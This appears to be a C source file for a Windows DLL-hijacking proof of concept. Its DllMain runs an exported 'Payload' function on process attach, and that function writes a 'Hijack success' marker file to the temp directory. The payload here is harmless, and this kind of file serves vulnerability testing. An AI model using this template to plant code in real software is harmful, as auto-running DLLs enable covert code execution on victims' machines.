#include <windows.h>
#include <stdio.h>

__declspec(dllexport) BOOL __stdcall Payload()
{
    
	FILE*	pTmpFile;
	WCHAR	PathFile[512] = { 0 };
	WCHAR	PathBuff[MAX_PATH] = { 0 };
	errno_t errno;

	GetTempPathW(MAX_PATH, PathBuff);
	wcscpy_s(PathFile, 512, PathBuff);
	wcscat_s(PathFile, 512, L"informer.tmp");
	errno = _wfopen_s(&pTmpFile, PathFile, L"w");
	if (pTmpFile == NULL || errno != 0)
		return FALSE;
    fwrite("Hijack success", 1, 15, pTmpFile);
	fclose(pTmpFile);
	return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		Payload();
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}